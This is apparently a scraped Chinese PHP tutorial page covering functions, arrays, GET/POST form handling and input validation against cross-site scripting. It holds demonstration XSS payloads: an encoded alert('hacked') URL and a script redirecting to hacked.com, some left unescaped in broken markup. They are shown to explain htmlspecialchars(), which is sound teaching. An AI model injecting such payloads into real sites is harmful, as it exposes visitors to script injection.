class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHP 函数准则：</p><ul><li>函数的名称应该提示出它的功能</li><li>函数名称以字母或下划线开头（不能以数字开头）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function sayHi() &#123;</span><br><span class="line">  echo &quot;Hello world!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayhi(); &#x2F;&#x2F; 调用函数</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">注： 可带参数，调用函数是传参即可，要记得php中的变量前要加$</span><br><span class="line">也可以带 return 返回值</span><br></pre></td></tr></table></figure><h3 id="PHP数组-1"><a href="#PHP数组-1" class="headerlink" title="PHP数组"></a>PHP数组</h3><p>数组在单个变量中存储多个值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;porsche&quot;,&quot;BMW&quot;,&quot;Volvo&quot;);</span><br><span class="line">echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">数组能够在单一变量名中存储许多值，并且您能够通过引用索引号来访问某个值。</span><br></pre></td></tr></table></figure><p><strong>创建数组</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array();</span><br></pre></td></tr></table></figure><p>在 PHP 中，有三种数组类型：</p><ul><li>索引数组 - 带有数字索引的数组</li><li>关联数组 - 带有指定键的数组</li><li>多维数组 - 包含一个或多个数组的数组</li></ul><h4 id="PHP-索引数组"><a href="#PHP-索引数组" class="headerlink" title="PHP 索引数组"></a>PHP 索引数组</h4><p>有两种创建索引数组的方法：<br>索引是自动分配的（索引从 0 开始）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$cars&#x3D;array(&quot;porsche&quot;,&quot;BMW&quot;,&quot;Volvo&quot;);</span><br><span class="line"></span><br><span class="line">或者也可以手动分配索引：</span><br><span class="line">$cars[0]&#x3D;&quot;porsche&quot;;</span><br><span class="line">$cars[1]&#x3D;&quot;BMW&quot;;</span><br><span class="line">$cars[2]&#x3D;&quot;Volvo&quot;;</span><br></pre></td></tr></table></figure><p><strong>获得数组的长度 - count() 函数</strong><br>count() 函数用于返回数组的长度（元素数）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;porsche&quot;,&quot;BMW&quot;,&quot;Volvo&quot;);</span><br><span class="line">echo count($cars);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出： 3</span><br></pre></td></tr></table></figure><p><strong>遍历索引数组</strong><br>如需遍历并输出索引数组的所有值，您可以使用 for 循环，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;porsche&quot;,&quot;BMW&quot;,&quot;Volvo&quot;);</span><br><span class="line">$arrlength&#x3D;count($cars);   &#x2F;&#x2F;获取数组长度赋值给arrlength</span><br><span class="line"></span><br><span class="line">for($x&#x3D;0;$x&lt;$arrlength;$x++) &#123;  &#x2F;&#x2F;遍历</span><br><span class="line">  echo $cars[$x];   </span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;  &#x2F;&#x2F;换行</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP关联数组"><a href="#PHP关联数组" class="headerlink" title="PHP关联数组"></a>PHP关联数组</h4><p>关联数组是使用您分配给数组的指定键(key)的数组。</p><p>有两种创建关联数组的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$age&#x3D;array(&quot;Bill&quot;&#x3D;&gt;&quot;35&quot;,&quot;Steve&quot;&#x3D;&gt;&quot;37&quot;,&quot;Elon&quot;&#x3D;&gt;&quot;43&quot;);</span><br><span class="line">或者：</span><br><span class="line"></span><br><span class="line">$age[&#39;Bill&#39;]&#x3D;&quot;63&quot;;</span><br><span class="line">$age[&#39;Steve&#39;]&#x3D;&quot;56&quot;;</span><br><span class="line">$age[&#39;Elon&#39;]&#x3D;&quot;47&quot;;</span><br></pre></td></tr></table></figure><p>随后可以在脚本中使用指定键key：</p><p>实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age&#x3D;array(&quot;Bill&quot;&#x3D;&gt;&quot;63&quot;,&quot;Steve&quot;&#x3D;&gt;&quot;56&quot;,&quot;Elon&quot;&#x3D;&gt;&quot;47&quot;);</span><br><span class="line">echo &quot;Elon is &quot; . $age[&#39;Elon&#39;] . &quot; years old.&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：Elon is 47 years old.</span><br></pre></td></tr></table></figure><p><strong>遍历关联数组</strong><br>如需遍历并输出关联数组的所有值，您可以使用 foreach 循环，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">&lt;?php</span><br><span class="line">$age&#x3D;array(&quot;Bill&quot;&#x3D;&gt;&quot;63&quot;,&quot;Steve&quot;&#x3D;&gt;&quot;56&quot;,&quot;Elon&quot;&#x3D;&gt;&quot;47&quot;);</span><br><span class="line"></span><br><span class="line">foreach($age as $x&#x3D;&gt;$x_value) &#123;</span><br><span class="line">  echo &quot;Key&#x3D;&quot; . $x . &quot;, Value&#x3D;&quot; . $x_value;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><h4 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h4><p>数组中的元素能够以字母或数字顺序进行升序或降序排序。</p><ul><li>sort() - 以升序对数组排序</li><li>rsort() - 以降序对数组排序</li><li>asort() - 根据值，以升序对关联数组进行排序</li><li>ksort() - 根据键，以升序对关联数组进行排序</li><li>arsort() - 根据值，以降序对关联数组进行排序</li><li>krsort() - 根据键，以降序对关联数组进行排序</li><li>()里放你要排序的数组 例如：$age</li></ul><h2 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h2><h3 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h3><p><strong>PHP 超全局变量 $_GET 和 $_POST 用于收集表单数据（form-data）。</strong></p><p><strong>PHP - 一个简单的 HTML 表单</strong><br>下面的例子显示了一个简单的 HTML 表单，它包含两个输入字段和一个提交按钮：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;welcome.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt;&lt;br&gt;</span><br><span class="line">E-mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;  </span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>解析：<br>当用户填写此表单并点击提交按钮后，表单数据会发送到名为 “welcome.php” 的 PHP 文件供处理。表单数据是通过 HTTP POST 方法发送的。</p><p>如需显示出被提交的数据，您可以简单地输出（echo）所有变量。”welcome.php” 文件是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">welcome.php文件</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">Welcome &lt;?php echo $_POST[&quot;name&quot;]; ?&gt;&lt;br&gt;</span><br><span class="line">Your email address is: &lt;?php echo $_POST[&quot;email&quot;]; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">Welcome Bill</span><br><span class="line">Your email address is Bill.Gates@example.com</span><br></pre></td></tr></table></figure><p><strong>使用 HTTP GET 方法也能得到相同的结果：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;welcome_get.php&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt;&lt;br&gt;</span><br><span class="line">E-mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>“welcome_get.php” 是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">Welcome &lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&lt;br&gt;</span><br><span class="line">Your email address is: &lt;?php echo $_GET[&quot;email&quot;]; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>上面的代码很简单。不过，最重要的内容被漏掉了。您需要对表单数据进行验证，以防止脚本出现漏洞。</p><p><strong>注意</strong>：在处理 PHP 表单时请关注安全！<br>本页未包含任何表单验证程序，它只向我们展示如何发送并接收表单数据。<br>不过稍后的章节会为您讲解如何提高 PHP 表单的安全性！对表单进行适当的安全验证对于抵御黑客攻击和垃圾邮件非常重要！</p><hr><p><strong>GET vs. POST</strong><br>GET 和 POST 都创建数组（例如，array( key =&gt; value, key2 =&gt; value2, key3 =&gt; value3, …)）。此数组包含键/值对，其中的键是表单控件的名称，而值是来自用户的输入数据。</p><p>GET 和 POST 被视作 $_GET 和 $_POST。它们是超全局变量，这意味着对它们的访问无需考虑作用域 - 无需任何特殊代码，您能够从任何函数、类或文件访问它们。</p><p>$_GET 是通过 URL 参数传递到当前脚本的变量数组。</p><p>$_POST 是通过 HTTP POST 传递到当前脚本的变量数组。</p><hr><p><strong>何时使用 GET？</strong><br>通过 GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。限制在大约 2000 个字符。不过，由于变量显示在 URL 中，把页面添加到书签中也更为方便。</p><p>GET 可用于发送非敏感的数据。</p><p>注释：绝不能使用 GET 来发送密码或其他敏感信息！</p><hr><p><strong>何时使用 POST？</strong><br>通过 POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中），并且对所发送信息的数量也无限制。</p><p>此外 POST 支持高阶功能，比如在向服务器上传文件时进行 multi-part 二进制输入。</p><p>不过，由于变量未显示在 URL 中，也就无法将页面添加到书签。</p><p>提示：开发者偏爱 POST 来发送表单数据。</p><p>接下来让我们看看如何安全地处理 PHP 表单！</p><h3 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h3><p>讲述，怎么使用代码，保护不被xss等攻击</p><p>PHP 表单验证<br>提示：在处理 PHP 表单时请重视安全性！</p><p>这些页面将展示如何安全地处理 PHP 表单。对 HTML 表单数据进行适当的验证对于防范黑客和垃圾邮件很重要！</p><p>我们稍后使用的 HTML 表单包含多种输入字段：必需和可选的文本字段、单选按钮以及提交按钮：<br><code>* </code>必填字段<br>Name: <input type="text" name="name"> <code>*</code><br>E-mail: <input type="text" name="email"> <code>*</code><br>Website: <input type="text" name="website"><br>Comment: <textarea name="comment" rows="5" cols="40"></textarea><br><input type="radio" name="gender" value="female">Female <input type="radio" name="gender" value="male">Male <code>*</code><br><input type="submit" name="submit" value="提交"></p><hr>上面的表单使用如下验证规则：<table><thead><tr><th align="center">字段</th><th align="center">验证规则</th></tr></thead><tbody><tr><td align="center">Name</td><td align="center">必需。必须包含字母和空格。</td></tr><tr><td align="center">E-mail</td><td align="center">必需。必须包含有效的电子邮件地址（包含 @ 和 .）。</td></tr><tr><td align="center">Website</td><td align="center">可选。如果选填，则必须包含有效的 URL。</td></tr><tr><td align="center">Comment</td><td align="center">可选。多行输入字段（文本框）。</td></tr><tr><td align="center">Gender</td><td align="center">必需。必须选择一项。</td></tr></tbody></table><hr><p><strong>首先我们看一下这个表单的纯 HTML 代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">name、email 和 website 属于文本输入元素，comment 字段是文本框。HTML 代码是这样的：</span><br><span class="line">**文本字段**</span><br><span class="line"></span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt;</span><br><span class="line">E-mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot;&gt;</span><br><span class="line">Website: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;website&quot;&gt;</span><br><span class="line">Comment: &lt;textarea name&#x3D;&quot;comment&quot; rows&#x3D;&quot;5&quot; cols&#x3D;&quot;40&quot;&gt;&lt;&#x2F;textarea&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">单选按钮</span><br><span class="line">gender 字段是单选按钮，HTML 代码是这样的：</span><br><span class="line">Gender:</span><br><span class="line">&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; value&#x3D;&quot;female&quot;&gt;Female</span><br><span class="line">&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; value&#x3D;&quot;male&quot;&gt;Male</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">表单元素</span><br><span class="line">表单的 HTML 代码是这样的：</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;</span><br><span class="line">提交此表单时，通过 method&#x3D;&quot;post&quot; 发送表单数据。</span><br></pre></td></tr></table></figure><p><strong>什么是 $_SERVER[“PHP_SELF”] 变量？</strong><br>$_SERVER[“PHP_SELF”] 是一种超全局变量，它返回当前执行脚本的文件名。<br>因此，$_SERVER[“PHP_SELF”] 将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。</p><p><strong>什么是 htmlspecialchars() 函数？</strong><br>htmlspecialchars() 函数把特殊字符转换为 HTML 实体。这意味着 &lt; 和 &gt; 之类的 HTML 字符会被替换为 &lt; 和 &gt; 。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。</p><hr><p>关于 PHP 表单安全性的重要提示<br>$_SERVER[“PHP_SELF”] 变量能够被黑客利用！</p><p>如果您的页面使用了 PHP_SELF，用户能够输入下划线然后执行跨站点脚本（XSS）。</p><p>提示：跨站点脚本（Cross-site scripting，XSS）是一种计算机安全漏洞类型，常见于 Web 应用程序。XSS 能够使攻击者向其他用户浏览的网页中输入客户端脚本。</p><p>假设我们的一张名为 “test_form.php” 的页面中有如下表单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>现在，如果用户进入的是地址栏中正常的 <code>URL：&quot;http://www.example.com/test_form.php&quot;</code>，上面的代码会转换为：</p><p><code>&lt;form method=&quot;post&quot; action=&quot;test_form.php&quot;&gt;</code><br>到目前，一切正常。</p><p>不过，如果用户在地址栏中键入了如下 URL：<br><code>http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert(&#39;hacked&#39;)%3C/script%3E</code></p><p>在这种情况下，上面的代码会转换为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;test_form.php&quot;&#x2F;&gt;&lt;script&gt;alert(&#39;hacked&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这段代码加入了一段脚本和一个提示命令。并且当此页面加载后，就会执行 JavaScript 代码（用户会看到一个提示框）。这仅仅是一个关于 PHP_SELF 变量如何被利用的简单无害案例。</p><p>您应该意识到<code> &lt;script&gt;</code> 标签内能够添加任何 JavaScript 代码！黑客能够把用户重定向到另一台服务器上的某个文件，该文件中的恶意代码能够更改全局变量或将表单提交到其他地址以保存用户数据，等等。</p><p><strong>如何避免 $_SERVER[“PHP_SELF”] 被利用？</strong><br>通过使用 htmlspecialchars() 函数能够避免 $_SERVER[“PHP_SELF”] 被利用。</p><p>表单代码是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;&#96;&#96;&#96;</span><br><span class="line">htmlspecialchars() 函数把特殊字符转换为 HTML 实体。现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出：</span><br></pre></td></tr></table></figure><form method="post" action="test_form.php/&quot;&gt;&lt;script&gt;alert('hacked')&lt;/script&gt;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">无法利用，没有危害！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">**通过 PHP 验证表单数据**</span><br><span class="line">我们要做的第一件事是通过 PHP 的 htmlspecialchars() 函数传递所有变量。</span><br><span class="line"></span><br><span class="line">在我们使用 htmlspecialchars() 函数后，如果用户试图在文本字段中提交以下内容：</span><br></pre></td></tr></table></figure><script>location.href('http://www.hacked.com')</script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码不会执行，因为会被保存为转义代码，就像这样：</span><br></pre></td></tr></table></figure>&lt;script&gt;location.href('http://www.hacked.com')&lt;/script&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">现在这条代码显示在页面上或 e-mail 中是安全的。</span><br><span class="line"></span><br><span class="line">在用户提交该表单时，我们还要做两件事：</span><br><span class="line"></span><br><span class="line">（通过 PHP trim() 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）</span><br><span class="line">（通过 PHP stripslashes() 函数）删除用户输入数据中的反斜杠（\）</span><br><span class="line">接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）。</span><br><span class="line"></span><br><span class="line">我们把函数命名为 test_input()。</span><br><span class="line"></span><br><span class="line">现在，我们能够通过 test_input() 函数检查每个 $_POST 变量，脚本是这样的：</span><br><span class="line"></span><br><span class="line">实例</span><br></pre></td></tr></table></figure><?php// 定义变量并设置为空值$name = $email = $gender = $comment = $website = "";<p>if ($_SERVER[“REQUEST_METHOD”] == “POST”) {<br>  $name = test_input($_POST[“name”]);<br>  $email = test_input($_POST[“email”]);<br>  $website = test_input($_POST[“website”]);<br>  $comment = test_input($_POST[“comment”]);<br>  $gender = test_input($_POST[“gender”]);<br>}</p><p>function test_input($data) {<br>  $data = trim($data);<br>  $data = stripslashes($data);<br>  $data = htmlspecialchars($data);<br>  return $data;<br>}<br>?&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">请注意在脚本开头，我们检查了表单是否使用 $_SERVER[&quot;REQUEST_METHOD&quot;] 进行提交。如果 REQUEST_METHOD 是 POST，那么表单已被提交 - 并且应该对其进行验证。如果未提交，则跳过验证并显示一个空白表单。</span><br><span class="line">不过，在上面的例子中，所有输入字段都是可选的。即使用户未输入任何数据，脚本也能正常工作。</span><br><span class="line">下一步是制作必填输入字段，并创建需要时使用的错误消息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 表单验证-必填字段</span><br><span class="line">**本节展示如何制作必填输入字段，并创建需要时所用的错误消息。**</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**PHP - 输入字段**</span><br><span class="line">从上一节中的验证规则中，我们看到 &quot;Name&quot;, &quot;E-mail&quot; 以及 &quot;Gender&quot; 字段是必需的。这些字段不能为空且必须在 HTML 表单中填写。</span><br><span class="line"></span><br><span class="line">|字段|验证规则|</span><br><span class="line">|:-:|:-:|</span><br><span class="line">|Name|必需。必须包含字母和空格。|</span><br><span class="line">|E-mail|必需。必须包含有效的电子邮件地址（包含 @ 和 .）。|</span><br><span class="line">|Website|可选。如果选填，则必须包含有效的 URL。|</span><br><span class="line">|Comment|可选。多行输入字段（文本框）。|</span><br><span class="line">|Gender|必需。必须选择一项。|</span><br><span class="line"></span><br><span class="line">在上一节中，所有输入字段都是可选的。</span><br><span class="line"></span><br><span class="line">在下面的代码中我们增加了一些新变量：$nameErr、$emailErr、$genderErr 以及 $websiteErr。这些错误变量会保存被请求字段的错误消息。我们还为每个 $_POST 变量添加了一个 if else 语句。这条语句检查 $_POST 变量是否为空（通过 PHP empty() 函数）。如果为空，则错误消息会存储于不同的错误变量中。如果不为空，则通过 test_input() 函数发送用户输入数据：</span><br></pre></td></tr></table></figure><?php// 定义变量并设置为空值$nameErr = $emailErr = $genderErr = $websiteErr = "";$name = $email = $gender = $comment = $website = "";if ($_SERVER["REQUEST_METHOD"] == "POST") {  if (empty($_POST["name"])) {    $nameErr = "姓名是必填的";    //没有填写时的提示信息  } else {    $name = test_input($_POST["name"]);  }  if (empty($_POST["email"])) {    $emailErr = "邮箱是必填的";  } else {    $email = test_input($_POST["email"]);  }  if (empty($_POST["website"])) {    $website = "";  } else {    $website = test_input($_POST["website"]);  }  if (empty($_POST["comment"])) {    $comment = "";  } else {    $comment = test_input($_POST["comment"]);  }  if (empty($_POST["gender"])) {    $genderErr = "性别是必选的";  } else {    $gender = test_input($_POST["gender"]);  }}?><p>// 检查传入参数的函数 test_input<br>function test_input($data) {<br>   $data = trim($data);<br>   $data = stripslashes($data);<br>   $data = htmlspecialchars($data);<br>   return $data;<br>}<br>?&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line">**PHP - 显示错误消息**</span><br><span class="line">在 HTML 表单中，我们在每个被请求字段后面增加了一点脚本。如果需要，会生成恰当的错误消息（如果用户未填写必填字段就试图提交表单）：</span><br><span class="line"></span><br><span class="line">实例</span><br></pre></td></tr></table></figure><form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>"><p>Name: <input type="text" name="name"><br><span class="error">* <?php echo $nameErr;?></span><br><br><br><br>E-mail:<br><input type="text" name="email"><br><span class="error">* <?php echo $emailErr;?></span><br><br><br><br>Website:<br><input type="text" name="website"><br><span class="error"><?php echo $websiteErr;?></span><br><br><br><br><label>Comment: <textarea name="comment" rows="5" cols="40"></textarea><br><br><br><br>Gender:<br><input type="radio" name="gender" value="female">Female<br><input type="radio" name="gender" value="male">Male<br><span class="error">* <?php echo $genderErr;?></span><br><br><br><br><input type="submit" name="submit" value="Submit"> </p></form><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">接下来是验证输入数据，即“Name 字段是否只包含字母和空格？”，以及“E-mail 字段是否包含有效的电子邮件地址语法？”，并且如果填写了 Website 字段，“这个字段是否包含了有效的 URL？”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">### 表单验证-验证E-mail和URL</span><br><span class="line">**本节展示如何验证名字、电邮和 URL。**</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**PHP - 验证名字**</span><br><span class="line">以下代码展示的简单方法检查 name 字段是否包含字母和空格。如果 name 字段无效，则存储一条错误消息：</span><br></pre></td></tr></table></figure>$name = test_input($_POST["name"]);if (!preg_match("/^[a-zA-Z ]*$/",$name)) {  $nameErr = "只允许字母和空格！"; }<p>注：preg_match — 进行正则表达式匹配。<br>语法：<br>int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )</p><p>在 subject 字符串中搜索与 pattern 给出的正则表达式相匹配的内容。如果提供了 matches ，则其会被搜索的结果所填充。$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 